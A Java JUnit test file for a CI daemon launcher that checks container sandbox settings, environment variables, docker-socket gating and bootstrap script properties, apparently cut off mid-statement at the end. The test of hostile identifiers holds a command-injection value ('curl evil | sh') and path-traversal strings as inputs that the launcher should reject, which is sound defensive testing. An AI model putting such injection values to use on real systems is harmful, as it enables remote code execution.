package eu.wohlben.qits.ci.daemonhost;

import eu.wohlben.qits.ci.control.CiRepoRef;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.containers.client.ContainersWire.EnsureRequest;
import eu.wohlben.qits.containers.client.ContainersWire.Policy;
import eu.wohlben.qits.containers.client.ContainersWire.Recreate;
import eu.wohlben.qits.containers.client.ContainersWire.Security;
import eu.wohlben.qits.containers.client.ContainersWire.Spec;
import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
import eu.wohlben.qits.ci.error.BadRequestException;
import eu.wohlben.qits.ci.idp.StubIdp;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * Workload-spec and bootstrap assembly only — a real orchestrator is {@code CiDaemonGateIT}'s
 * subject and the HTTP reading of its four answers is {@code CiDaemonLauncherContainersTest}'s.
 * Worth its own test because the spec <b>is</b> the sandbox: a field lost in a refactor is invisible
 * everywhere else until it is invisible in production.
 *
 * <p><b>The assertion is the whole request, by equality.</b> It used to be the whole argv, a flat
 * list of eighty strings; the same claim over a record tree is one {@code assertEquals} against a
 * literal, and it still fails when a field goes missing rather than when someone remembers to check
 * for it.
 *
 * <p><b>Deliberately does not exercise {@link CiDaemonLauncher#daemonVersion()}.</b> That method
 * delegates to the injected {@code CiDaemonPins} ladder (ci-daemon-autoadopt-plan.md, workstream
 * BV), a real CDI bean this plain-construction test never wires up; its coverage lives in
 * {@code CiDaemonPinsTest} and {@code CiDaemonPinTest} instead. This class stays about pure spec
 * assembly, which is why it can be {@code new CiDaemonLauncher()} with fields set by hand rather
 * than a {@code @QuarkusTest} — and why it needs no client at all: nothing here sends anything.
 */
public class CiDaemonLauncherTest {

  private CiDaemonLauncher launcher() {
    return launcher("http://qits-githost:8080/");
  }

  private CiDaemonLauncher launcher(String containerGitUrl) {
    CiDaemonLauncher launcher = new CiDaemonLauncher();
    launcher.owner = "dev-qits-ci";
    launcher.network = "qits-net";
    launcher.containerGitUrl = containerGitUrl;
    launcher.containerDaemonUrl = "ws://qits-ci:8080/ci/daemon";
    launcher.daemonBinaryUrlTemplate = "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/{version}";
    launcher.registerTimeoutSeconds = 60;
    launcher.initTimeoutSeconds = 120;
    launcher.stepTimeoutSeconds = 900;
    launcher.stepTimeoutGraceSeconds = 60;
    launcher.outputMaxChars = 65536;
    launcher.memoryLimit = "4g";
    launcher.pidsLimit = 2048;
    launcher.cpus = "2";
    launcher.oomScoreAdj = 1000;
    launcher.artifactsRegistryHost = "qits-artifacts:8080";
    launcher.artifactsImageRepository = "qits";
    launcher.dockerAuthHosts = List.of("qits-artifacts:8080");
    // The shipped state of the platform builder: on, with the in-network registry beside it. The
    // address itself is qits-containers' to inject, which is why no BUILDKIT_HOST appears in any
    // ON-state environment here — absence IS the contract (the orchestrator fills an absent key).
    launcher.buildkitEnabled = true;
    launcher.buildkitRegistryHost = "qits-platform-artifacts:8080";
    launcher.artifactsNpmHostedUrl = "http://qits-artifacts:8080/artifacts/npm/npm/";
    launcher.artifactsNpmProxyUrl = "http://qits-artifacts:8080/artifacts/npm/npmjs/";
    launcher.artifactsMavenRegistryUrl = "http://qits-artifacts:8080/artifacts/maven/maven";
    launcher.mavenCentralMirrorEnabled = true;
    launcher.mavenCentralMirrorBuildUrl =
        java.util.Optional.of("http://mirror.dev.localhost:8080/mirror/maven/central");
    launcher.mavenCentralMirrorStepUrl = "http://qits-platform-mirror:8080/mirror/maven/central";
    launcher.artifactsDocsUrl = "http://qits-artifacts:8080/artifacts/docs/docs";
    launcher.workspacesUrl = "http://qits-workspaces:8080";
    // The shipped state of the push credential: an oidc client that is off, so nothing is
    // commissioned and nothing is injected. Written out rather than left null, because "this
    // deployment cannot commission" is the case half of this file is about — the commissioned path
    // itself is RunCommissioningTest's, against a real stub idp.
    launcher.commissions = StubIdp.disabledCommissions();
    return launcher;
  }

  private final LaunchSpec spec =
      new LaunchSpec(
          "0123456789abcdef-run",
          2,
          CiRepoRef.of("repo-1"),
          "main",
          "cafebabe",
          "maven:3.9",
          "daemon-7",
          "s3cr3t",
          "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef",
          0,
          false,
          "",
          Map.of());

  /** The same step, having declared {@code docker: true} — the only difference anywhere. */
  private LaunchSpec publishing() {
    return withDocker(spec, true);
  }

  private static LaunchSpec withDocker(LaunchSpec original, boolean docker) {
    return new LaunchSpec(
        original.runId(),
        original.stepIndex(),
        original.repo(),
        original.branch(),
        original.sha(),
        original.image(),
        original.daemonId(),
        original.secret(),
        original.daemonBinaryUrl(),
        original.stepTimeoutSeconds(),
        docker,
        original.user(),
        original.env());
  }

  /** The same step, having declared {@code user: build} — again the only difference anywhere. */
  private LaunchSpec asBuildUser() {
    return new LaunchSpec(
        spec.runId(),
        spec.stepIndex(),
        spec.repo(),
        spec.branch(),
        spec.sha(),
        spec.image(),
        spec.daemonId(),
        spec.secret(),
        spec.daemonBinaryUrl(),
        spec.stepTimeoutSeconds(),
        spec.docker(),
        "build",
        spec.env());
  }

  /** The environment every step container gets, in the order the spec writes it. */
  private static Map<String, String> contractEnv() {
    Map<String, String> env = new LinkedHashMap<>();
    env.put("QITS_CI_DAEMON_ID", "daemon-7");
    env.put("QITS_CI_DAEMON_SECRET", "s3cr3t");
    env.put("QITS_CI_DAEMON_URL", "ws://qits-ci:8080/ci/daemon");
    env.put(
        "QITS_CI_DAEMON_BINARY_URL",
        "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/deadbeef");
    env.put("QITS_CI_REPOSITORY_URL", "http://qits-githost:8080/git/repo-1");
    env.put("QITS_CI_BRANCH", "main");
    env.put("QITS_CI_SHA", "cafebabe");
    env.put("QITS_CI_REPO_ID", "repo-1");
    // The public coordinate, EMPTY rather than absent on an id-addressed run: one shape for a step
    // to read, whichever way its run was announced.
    env.put("QITS_CI_PROJECT_ID", "");
    env.put("QITS_CI_REPO_NAME", "");
    env.put("CI", "true");
    env.put("QITS_CI", "true");
    env.put("QITS_REGISTRY", "qits-artifacts:8080");
    env.put("QITS_IMAGE_REPOSITORY", "qits");
    env.put("QITS_NPM_REGISTRY_URL", "http://qits-artifacts:8080/artifacts/npm/npm/");
    env.put("QITS_NPM_PROXY_URL", "http://qits-artifacts:8080/artifacts/npm/npmjs/");
    env.put("QITS_MAVEN_REGISTRY_URL", "http://qits-artifacts:8080/artifacts/maven/maven");
    // Both planes carry the mirror on /mirror/maven: the build plane the edge vhost, the step plane
    // the in-network alias.
    env.put(
        "QITS_MAVEN_CENTRAL_MIRROR_URL", "http://mirror.dev.localhost:8080/mirror/maven/central");
    env.put("QITS_MAVEN_PROXY_URL", "http://qits-platform-mirror:8080/mirror/maven/central");
    env.put("QITS_DOCS_URL", "http://qits-artifacts:8080/artifacts/docs/docs");
    env.put("QITS_WORKSPACES_URL", "http://qits-workspaces:8080");
    return env;
  }

  /**
   * The whole request, written out. Every field is here on purpose, including the six that are
   * {@code null}: what an absent list or an unset pull policy means is the orchestrator's default,
   * and a literal that skipped them would pass just as happily against a spec that had started
   * sending something.
   */
  @Test
  public void buildsTheWholeWorkloadSpec() {
    assertEquals(
        new EnsureRequest(
            new Spec(
                "maven:3.9",
                List.of("/bin/sh"),
                List.of("-c", CiDaemonLauncher.BOOTSTRAP),
                contractEnv(),
                Map.of("qits.ci.run", "0123456789abcdef-run"),
                "qits-net",
                null,
                List.of("host.docker.internal:host-gateway"),
                null,
                null,
                false,
                new Security(true, true, "4g", "4g", 2048L, "2", 1000),
                null,
                "qits-ci-01234567-412621e6-2",
                "",
                null),
            // 60 register + 120 initialize + 900 default step + 60 grace + 900 slop.
            Policy.ephemeral(2040L),
            Recreate.never),
        launcher().buildWorkloadSpec(spec));
  }

  @Test
  public void aNamedRunClonesByProjectAndNameAndSaysSoInTheEnvironment() {
    // The post-cutover arm. Three values move together: the clone url becomes the public address,
    // and the two new variables carry the pair a pipeline reads. QITS_CI_REPO_ID keeps announcing
    // the STORAGE id — every pipeline in the estate still reads it, and a later work package is
    // what moves them off it.
    LaunchSpec named =
        new LaunchSpec(
            spec.runId(),
            spec.stepIndex(),
            CiRepoRef.of("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", "qits", "qits-blobstore"),
            spec.branch(),
            spec.sha(),
            spec.image(),
            spec.daemonId(),
            spec.secret(),
            spec.daemonBinaryUrl(),
            spec.stepTimeoutSeconds(),
            spec.docker(),
            spec.user(),
            spec.env());

    Map<String, String> env = launcher().buildWorkloadSpec(named).spec().env();
    assertEquals("http://qits-githost:8080/git/qits/qits-blobstore", env.get("QITS_CI_REPOSITORY_URL"));
    assertEquals("qits", env.get("QITS_CI_PROJECT_ID"));
    assertEquals("qits-blobstore", env.get("QITS_CI_REPO_NAME"));
    assertEquals("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", env.get("QITS_CI_REPO_ID"));
  }

  @Test
  public void aStepThatDeclaredDockerGetsTheHostSocketAndOnlyThat() {
    EnsureRequest plain = launcher().buildWorkloadSpec(spec);
    EnsureRequest withDocker = launcher().buildWorkloadSpec(publishing());

    // The flag is set, and the orchestrator is what turns it into a mount at the path the step
    // image's CLI looks at — which is why there is no path in this request at all any more.
    assertTrue(withDocker.spec().hostDockerSocket());

    // And the sandbox does not relax for a publish step: capDropAll and noNewPrivileges cost a
    // socket client nothing and keeping them unconditional is what keeps them meaning something for
    // the steps that never opt in. The diff is the socket plus the BuildKit variables (the two
    // mode flags and $QITS_BUILD_REGISTRY), which are a build MODE rather than a privilege —
    // asserted as an exact residue rather than as spot checks, the same claim the old argv test
    // made by deleting list elements and comparing the rest.
    assertNotEquals(plain, withDocker);
    assertEquals(
        plain,
        new EnsureRequest(
            withoutSocket(withoutBuildKit(withDocker.spec())),
            withDocker.policy(),
            withDocker.recreate()));
    assertTrue(withDocker.spec().security().capDropAll());
    assertTrue(withDocker.spec().security().noNewPrivileges());
  }

  /** The BuildKit variables taken back out, so the residue is comparable to a plain step's. */
  private static Spec withoutBuildKit(Spec original) {
    Map<String, String> env = new LinkedHashMap<>(original.env());
    env.remove("DOCKER_BUILDKIT");
    env.remove("BUILDX_NO_DEFAULT_ATTESTATIONS");
    env.remove("QITS_BUILD_REGISTRY");
    return new Spec(
        original.image(),
        original.entrypoint(),
        original.args(),
        env,
        original.extraLabels(),
        original.network(),
        original.aliases(),
        original.addHosts(),
        original.volumeMounts(),
        original.sharedMounts(),
        original.hostDockerSocket(),
        original.security(),
        original.pullPolicy(),
        original.explicitName(),
        original.user(),
        original.init());
  }

  /** The one field under test, put back to what a step that declared nothing would have sent. */
  private static Spec withoutSocket(Spec original) {
    return new Spec(
        original.image(),
        original.entrypoint(),
        original.args(),
        original.env(),
        original.extraLabels(),
        original.network(),
        original.aliases(),
        original.addHosts(),
        original.volumeMounts(),
        original.sharedMounts(),
        false,
        original.security(),
        original.pullPolicy(),
        original.explicitName(),
        original.user(),
        original.init());
  }

  @Test
  public void aDockerStepUnderTheKillSwitchReadsEmptyAndNeverAbsent() {
    // OFF is empty-never-absent, the mirror pair's shape: an empty BUILDKIT_HOST is what stops
    // qits-containers filling the key in (it defers to any present key), and an empty
    // QITS_BUILD_REGISTRY is what makes a converted recipe's `set -u` composition fail loudly
    // rather than push to a ref built out of nothing.
    CiDaemonLauncher off = launcher();
    off.buildkitEnabled = false;

    Map<String, String> env = off.buildWorkloadSpec(publishing()).spec().env();
    assertEquals("", env.get("BUILDKIT_HOST"));
    assertEquals("", env.get("QITS_BUILD_REGISTRY"));

    // And the switch reaches ONLY the two buildkit keys — the socket, the mode flags and the rest
    // of the environment stay exactly the ON state's, or flipping it mid-fleet would change more
    // than it says.
    Map<String, String> on =
        new LinkedHashMap<>(launcher().buildWorkloadSpec(publishing()).spec().env());
    on.put("QITS_BUILD_REGISTRY", "");
    on.put("BUILDKIT_HOST", "");
    assertEquals(on, env);
  }

  @Test
  public void anOnStateDockerStepCarriesTheBuildRegistryAndNoAddress() {
    Map<String, String> env = launcher().buildWorkloadSpec(publishing()).spec().env();
    assertEquals("qits-platform-artifacts:8080", env.get("QITS_BUILD_REGISTRY"));
    // No BUILDKIT_HOST: the address is qits-containers' deployment fact, injected there — an
    // address spelled here too would be the two-copies drift the docker-socket-path deletion
    // already paid for once.
    assertFalse(env.containsKey("BUILDKIT_HOST"));
  }

  @Test
  public void aStepThatDeclaredNothingGetsNoDockerSocketAtAll() {
    // THIS is the security assertion of the pair — the absence, not the presence. A step's script is
    // repo-controlled code and the docker socket is root on the host, so "no socket unless the config
    // said so" is the invariant, and an accidental unconditional flag would be invisible everywhere
    // else in this repository until it was invisible in production.
    Spec workload = launcher().buildWorkloadSpec(spec).spec();
    assertFalse(workload.hostDockerSocket());
    // And nothing else may smuggle one in: a mount list, or a socket path hidden in an environment
    // value the daemon would find.
    assertEquals(null, workload.volumeMounts());
    assertEquals(null, workload.sharedMounts());
    for (Map.Entry<String, String> entry : workload.env().entrySet()) {
      assertFalse(
          entry.getValue().contains("docker.sock"),
          "no step may see a docker socket it did not ask for: " + entry);
    }
  }

  @Test
  public void aStepThatDeclaredAUserRunsAsThatUserAndNothingElseChanges() {
    EnsureRequest plain = launcher().buildWorkloadSpec(spec);
    EnsureRequest asBuild = launcher().buildWorkloadSpec(asBuildUser());

    assertEquals("build", asBuild.spec().user());

    // Exactly one field, the same claim the socket pair makes: the sandbox does not relax for a
    // step that dropped root, and nothing else about the request moves. The declaration is here at
    // all because the container cannot do it itself — --cap-drop=ALL leaves no CAP_SETUID for `su`
    // and no CAP_CHOWN for the checkout, measured 2026-08-12 on qits-containers.
    assertNotEquals(plain, asBuild);
    assertEquals(
        plain,
        new EnsureRequest(withoutUser(asBuild.spec()), asBuild.policy(), asBuild.recreate()));
    assertTrue(asBuild.spec().security().capDropAll());
    assertTrue(asBuild.spec().security().noNewPrivileges());
  }

  /** The one field under test, put back to what a step that declared nothing would have sent. */
  private static Spec withoutUser(Spec original) {
    return new Spec(
        original.image(),
        original.entrypoint(),
        original.args(),
        original.env(),
        original.extraLabels(),
        original.network(),
        original.aliases(),
        original.addHosts(),
        original.volumeMounts(),
        original.sharedMounts(),
        original.hostDockerSocket(),
        original.security(),
        original.pullPolicy(),
        original.explicitName(),
        "",
        original.init());
  }

  @Test
  public void aStepThatDeclaredNoUserRunsAsTheImagesOwn() {
    // The absence, asserted on its own. An unset user means the image's default, and a value that
    // appeared unasked would run every existing pipeline as somebody its image never provisioned —
    // which fails deep inside a build with a permission error rather than at the launch.
    assertEquals("", launcher().buildWorkloadSpec(spec).spec().user());
    assertEquals("", launcher().buildWorkloadSpec(publishing()).spec().user());
  }

  @Test
  public void everyStepIsToldWhereAPublishedImageGoes() {
    // Injected unconditionally, opted in or not: "which registry" must never be a literal in a
    // repository's pipeline. With $QITS_CI_SHA these two are the whole tag convention qits-cd pulls
    // by, and they are named after their owner because qits-cd ships the same pair.
    for (LaunchSpec each : List.of(spec, publishing())) {
      Map<String, String> env = launcher().buildWorkloadSpec(each).spec().env();
      assertEquals("qits-artifacts:8080", env.get("QITS_REGISTRY"));
      assertEquals("qits", env.get("QITS_IMAGE_REPOSITORY"));
      assertEquals("cafebabe", env.get("QITS_CI_SHA"));
    }
  }

  @Test
  public void everyStepIsToldWhereNpmPackagesComeFromAndGoTo() {
    // Also unconditional, and for the same reason — but note what changes about the reasoning: these
    // two are dialled by the step container itself over the shared network, so a publish to them is
    // an ordinary HTTP step that never declares `docker: true`, and the in-network alias is the
    // value that is CORRECT here rather than the one a host-published mapping replaces.
    for (LaunchSpec each : List.of(spec, publishing())) {
      Map<String, String> env = launcher().buildWorkloadSpec(each).spec().env();
      assertEquals("http://qits-artifacts:8080/artifacts/npm/npm/", env.get("QITS_NPM_REGISTRY_URL"));
      assertEquals("http://qits-artifacts:8080/artifacts/npm/npmjs/", env.get("QITS_NPM_PROXY_URL"));
    }
  }

  @Test
  public void everyStepIsToldWhereMavenPackagesComeFromAndGoTo() {
    for (LaunchSpec each : List.of(spec, publishing())) {
      assertEquals(
          "http://qits-artifacts:8080/artifacts/maven/maven",
          launcher().buildWorkloadSpec(each).spec().env().get("QITS_MAVEN_REGISTRY_URL"));
    }
  }

  @Test
  public void bothPlanesCarryTheMirrorOnItsOwnMirrorRoute() {
    // Both planes reach the mirror, each by the route its network can see. The build plane (a
    // docker-build arg) hits the EDGE vhost mirror.dev.localhost/mirror/maven — /mirror is the
    // mirror's own route; /artifacts routes to the hosted registry there. The step plane hits the
    // in-network alias. Both on /mirror/maven, the mount qits-mirror now serves.
    for (LaunchSpec each : List.of(spec, publishing())) {
      Map<String, String> env = launcher().buildWorkloadSpec(each).spec().env();
      assertEquals(
          "http://mirror.dev.localhost:8080/mirror/maven/central",
          env.get("QITS_MAVEN_CENTRAL_MIRROR_URL"));
      assertEquals(
          "http://qits-platform-mirror:8080/mirror/maven/central",
          env.get("QITS_MAVEN_PROXY_URL"));
    }
  }

  @Test
  public void aDeploymentThatCannotReachTheMirrorInjectsTheCentralPairEMPTY() {
    // Empty, never absent, is the off state: every .qits-maven-settings.xml activates its
    // central-proxy profile only on a non-empty value, so an empty pair means every build resolves
    // Maven Central directly — the arm a bootstrap is on while the mirror is not started yet. The
    // keys must still be PRESENT, because a pipeline reads "${QITS_MAVEN_CENTRAL_MIRROR_URL:-}"
    // under `set -u` and one shape for a step to read is the estate's rule for optional values.
    CiDaemonLauncher launcher = launcher();
    launcher.mavenCentralMirrorEnabled = false;
    for (LaunchSpec each : List.of(spec, publishing())) {
      Map<String, String> env = launcher.buildWorkloadSpec(each).spec().env();
      assertEquals("", env.get("QITS_MAVEN_CENTRAL_MIRROR_URL"));
      assertEquals("", env.get("QITS_MAVEN_PROXY_URL"));
    }
  }

  @Test
  public void everyStepIsToldWhereItsDocumentationGoes() {
    // Including the `docs` namespace segment: there is one docs repository and a pipeline that got
    // to name one could publish into a namespace nothing serves.
    for (LaunchSpec each : List.of(spec, publishing())) {
      assertEquals(
          "http://qits-artifacts:8080/artifacts/docs/docs",
          launcher().buildWorkloadSpec(each).spec().env().get("QITS_DOCS_URL"));
    }
  }

  @Test
  public void everyStepIsToldWhereToAskForItsOwnRepositoryToBeReleased() {
    // The release train's maintenance step POSTs to qits-workspaces after the tests it follows went
    // green. Unconditional and container-dialled for the same reasons as the npm pair: the file
    // states no deployment fact, and the in-network alias is what a step container can reach.
    for (LaunchSpec each : List.of(spec, publishing())) {
      assertEquals(
          "http://qits-workspaces:8080",
          launcher().buildWorkloadSpec(each).spec().env().get("QITS_WORKSPACES_URL"));
    }
  }

  @Test
  public void theBootstrapIsWhatTurnsACredentialIntoAFileAndItDoesItBeforeTheDaemonRuns() {
    // The document itself is commissioned per run and asserted in RunCommissioningTest; what is
    // pinned here is the mechanism, which is a property of BOOTSTRAP alone: two variables, a file
    // under /tmp — never in the checkout, so a `docker build` from /workspace can never carry the
    // credential into a published image — and written before the daemon becomes PID 1, or the step
    // would run before the file existed.
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    assertTrue(bootstrap.contains("\"$DOCKER_CONFIG/config.json\""), bootstrap);
    assertTrue(bootstrap.contains("$QITS_CI_REGISTRY_AUTH_CONFIG"), bootstrap);
    assertTrue(CiDaemonLauncher.REGISTRY_AUTH_DIR.startsWith("/tmp/"), CiDaemonLauncher.REGISTRY_AUTH_DIR);
    assertTrue(
        bootstrap.indexOf("config.json") < bootstrap.indexOf("exec /tmp/qits-ci-daemon"), bootstrap);
  }

  @Test
  public void aDeploymentThatCannotCommissionSendsExactlyWhatItAlwaysSent() {
    // The byte-identical case, and the reason the fallback arm exists: a registry that answers an
    // anonymous push is the shape this platform shipped with, and a deployment with no oidc client
    // must not gain a credential variable, a file or a directory. What a docker step does gain is
    // the two BuildKit variables, which are a build mode rather than a credential.
    assertEquals(contractEnv(), launcher().buildWorkloadSpec(spec).spec().env());

    Map<String, String> publishingEnv = launcher().buildWorkloadSpec(publishing()).spec().env();
    Map<String, String> expected = contractEnv();
    expected.put("DOCKER_BUILDKIT", "1");
    expected.put("BUILDX_NO_DEFAULT_ATTESTATIONS", "1");
    expected.put("QITS_BUILD_REGISTRY", "qits-platform-artifacts:8080");
    assertEquals(expected, publishingEnv);
    assertFalse(publishingEnv.containsKey("DOCKER_CONFIG"));
    assertFalse(publishingEnv.containsKey("QITS_CI_REGISTRY_AUTH_CONFIG"));
    assertFalse(publishingEnv.containsKey("QITS_COMMISSIONED_CLIENT_ID"));
    assertFalse(publishingEnv.containsKey("QITS_COMMISSIONED_CLIENT_SECRET"));
  }

  @Test
  public void onlyADockerStepIsToldToUseBuildKit() {
    // Every step image ships buildx as of qits-oci 2026.814.110556, so a legacy build is a SILENT
    // FALLBACK rather than an image with no choice — and a silent fallback is what quietly drops a
    // --secret mount. DOCKER_BUILDKIT=1 makes it a loud error instead. The second variable keeps a
    // push a single manifest: buildx attaches provenance and SBOM attestations by default, and the
    // platform registry expects one manifest per tag.
    Map<String, String> publishingEnv = launcher().buildWorkloadSpec(publishing()).spec().env();
    assertEquals("1", publishingEnv.get("DOCKER_BUILDKIT"));
    assertEquals("1", publishingEnv.get("BUILDX_NO_DEFAULT_ATTESTATIONS"));

    // And no step that cannot build gets an opinion about how builds are done.
    Map<String, String> plainEnv = launcher().buildWorkloadSpec(spec).spec().env();
    assertFalse(plainEnv.containsKey("DOCKER_BUILDKIT"));
    assertFalse(plainEnv.containsKey("BUILDX_NO_DEFAULT_ATTESTATIONS"));
  }

  /**
   * <b>The run's own extras are written last and the platform's contract first.</b> Today the map is
   * the four {@code QITS_EVENT_*} of an event-triggered run and empty on every push, and none of it
   * is repo-authored — so this pins the ORDER rather than a safety property, exactly as the argv
   * did: last in the argv meant a repeated {@code --env} whose later value won, and last into a map
   * means the same thing.
   */
  @Test
  public void runScopedExtrasAreWrittenAfterTheContractAndInSortedOrder() {
    LaunchSpec triggered =
        new LaunchSpec(
            spec.runId(),
            spec.stepIndex(),
            spec.repo(),
            spec.branch(),
            spec.sha(),
            spec.image(),
            spec.daemonId(),
            spec.secret(),
            spec.daemonBinaryUrl(),
            spec.stepTimeoutSeconds(),
            false,
            "",
            Map.of("QITS_EVENT_VERSION", "1.2.3", "QITS_EVENT_NAME", "SoftwareRelease"));

    Map<String, String> expected = contractEnv();
    expected.put("QITS_EVENT_NAME", "SoftwareRelease");
    expected.put("QITS_EVENT_VERSION", "1.2.3");

    Map<String, String> actual = launcher().buildWorkloadSpec(triggered).spec().env();
    assertEquals(expected, actual);
    assertEquals(List.copyOf(expected.keySet()), List.copyOf(actual.keySet()), "written in this order");
  }

  /**
   * <b>The lifetime the registry collects at is a sum of deadlines, never a guess.</b> A step that
   * declares its own {@code timeout-seconds} moves it; a step that declares none gets the configured
   * default in the same sum. The slop is what keeps this a backstop rather than a second timeout —
   * every deadline in the sum is enforced by something that reports what it enforced, and a maxAge
   * that could fire first would take a container away mid-step.
   */
  @Test
  public void theRegistryLifetimeCoversEveryDeadlineAStepMaySpend() {
    LaunchSpec longStep =
        new LaunchSpec(
            spec.runId(),
            spec.stepIndex(),
            spec.repo(),
            spec.branch(),
            spec.sha(),
            spec.image(),
            spec.daemonId(),
            spec.secret(),
            spec.daemonBinaryUrl(),
            3600,
            false,
            "",
            Map.of());
    // 60 + 120 + 3600 + 60 + 900
    assertEquals(4740L, launcher().maxAgeSeconds(longStep));
    // A step that declared nothing falls back to qits.ci.step-timeout-seconds, not to zero.
    assertEquals(2040L, launcher().maxAgeSeconds(spec));
    assertEquals(
        Policy.ephemeral(4740L), launcher().buildWorkloadSpec(longStep).policy());
  }

  /**
   * <b>The container name is the ref, and one place per step of one run is what that buys.</b> The
   * registry's identity is owner/workload/ref with one live row per triple, so a retry of the same
   * step has to address the same row rather than make a second one — which is a property of the name
   * being derived from the run and the step index and nothing else.
   */
  @Test
  public void theContainerNameIsAlsoTheRefAndIsStableForOneStep() {
    String name = CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex());
    assertEquals(name, launcher().buildWorkloadSpec(spec).spec().explicitName());
    assertEquals(name, CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex()));
    assertNotEquals(name, CiDaemonLauncher.containerName(spec.runId(), spec.stepIndex() + 1));
    // ContainersIdentifiers' charset for a ref: lowercase, alphanumerics and dashes, no leading one.
    assertTrue(name.matches("[a-z0-9][a-z0-9-]*"), name);
  }

  @Test
  public void theContainerIsNotSelfRemoving() {
    // There is no way to ask for one: the wire has no --rm, and the policy is EPHEMERAL, which is
    // about what may REPLACE the container rather than about it removing itself. A self-removing
    // container would race the log capture that is the only diagnosis a container which never
    // registered can offer; every teardown is an explicit delete instead.
    assertEquals(
        eu.wohlben.qits.containers.client.ContainersWire.PolicyType.EPHEMERAL,
        launcher().buildWorkloadSpec(spec).policy().type());
    assertEquals(Recreate.never, launcher().buildWorkloadSpec(spec).recreate());
  }

  @Test
  public void theBootstrapInterpolatesNothingAtAll() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    // Every value the container needs is a shell variable it reads from its own environment. If any
    // of these appeared in the text, a repository would have found a way into a command line.
    for (String value :
        List.of("repo-1", "cafebabe", "main", "daemon-7", "s3cr3t", "maven:3.9", "qits-artifacts")) {
      assertFalse(bootstrap.contains(value), "bootstrap must not carry '" + value + "'");
    }
    // ...and it travels as ITS OWN list element, which is what makes zero interpolation a property
    // of the construction rather than of an argv somebody has to keep reading.
    assertEquals(List.of("-c", bootstrap), launcher().buildWorkloadSpec(spec).spec().args());
    assertEquals(List.of("/bin/sh"), launcher().buildWorkloadSpec(spec).spec().entrypoint());
    // ...and the invariant the whole feature rests on: no repo-controlled code in a host argv.
    assertFalse(bootstrap.contains("bash -c"), bootstrap);
    // No docker vocabulary either — this text runs no program of that name and never has. It does
    // now write the push credential to $DOCKER_CONFIG, which is an environment variable the shell
    // expands rather than a command, and the assertion below still says so because the variable is
    // upper case and the program would not be.
    assertFalse(bootstrap.contains("docker"), bootstrap);
  }

  @Test
  public void theBootstrapProbesBothDownloadersAndSaysSoWhenItHasNeither() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    assertTrue(bootstrap.contains("command -v wget"), bootstrap);
    assertTrue(bootstrap.contains("command -v curl"), bootstrap);
    // The image contract, stated in the container's own log — which is what the never-registered
    // teardown captures, so an image missing a downloader diagnoses itself.
    assertTrue(bootstrap.contains("neither wget nor curl"), bootstrap);
    assertTrue(bootstrap.contains("chmod +x /tmp/qits-ci-daemon"), bootstrap);
    // exec, so the daemon is PID 1 and the removal signals it rather than a wrapping shell.
    assertTrue(bootstrap.contains("exec /tmp/qits-ci-daemon"), bootstrap);
  }

  @Test
  public void theBinaryUrlIsTheVersionResolvedIntoTheTemplate() {
    // One template rather than two free values, so the version pin and the download address cannot
    // drift apart. {version} is a version-addressed pin, not a digest, since the template flip
    // (ci-daemon-autoadopt-plan.md); resolveBinaryUrl itself does not care which spelling it is
    // handed.
    assertEquals(
        "http://qits-artifacts:8080/artifacts/daemons/qits-ci-daemon/abc123",
        launcher().resolveBinaryUrl("abc123"));
  }

  /**
   * The configured base names the SERVICE and ci appends {@code /git/<repoId>} — which is what makes
   * qits-githost's move a config change rather than a code change. The host used to answer under
   * qits-artifacts' {@code /artifacts} segment and answers at the root now; both are just bases to
   * this method, and the fixture's trailing slash is stripped either way.
   */
  @Test
  public void theCloneUrlEndsAtTheServiceAndCiAppendsTheGitSegment() {
    assertEquals(
        "http://qits-githost:8080/git/repo-1", launcher().cloneUrl(CiRepoRef.of("repo-1")));
    assertEquals(
        "http://a-host-of-any-depth/below/git/repo-1",
        launcher("http://a-host-of-any-depth/below").cloneUrl(CiRepoRef.of("repo-1")));
    // And the public form, which is what a named run clones from: the project and the name, never
    // the storage id — after the cutover that id is not an address a step container may use at all.
    assertEquals(
        "http://qits-githost:8080/git/qits/qits-blobstore",
        launcher().cloneUrl(CiRepoRef.of("2f1c9b3e-4a5b-6c7d-8e9f-0a1b2c3d4e5f", "qits", "qits-blobstore")));
  }

  /**
   * <b>Pre-flight, and that is not made redundant by the orchestrator checking again.</b> Every one
   * of these throws before the client is touched — which this test proves by construction, since the
   * launcher it builds has no client at all and a call that reached one would NPE rather than throw
   * a {@code BadRequestException}. Two checkpoints, one rule each side owns: a refusal here names
   * the field to the run, a refusal there is a 400 nothing retries out of.
   */
  @Test
  public void hostileIdentifiersAreRejectedBeforeAnyCallIsMade() {
    CiDaemonLauncher launcher = launcher();
    LaunchSpec injectedSha =
        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "x\"; curl evil | sh #", "img", "d", "s", "u", 0, false, "", Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
    LaunchSpec traversal =
        new LaunchSpec("run", 0, CiRepoRef.of("../../etc"), "main", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
    LaunchSpec injectedBranch =
        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main/../..", "cafebabe", "img", "d", "s", "u", 0, false, "", Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
    // The image is repo-declared rather than intake-supplied, and it still reaches a docker argv on
    // the far side of the wire. Nothing is known to get through it, but an argument that can be read
    // as an option is not a thing to leave to another service's good manners.
    LaunchSpec optionShapedImage =
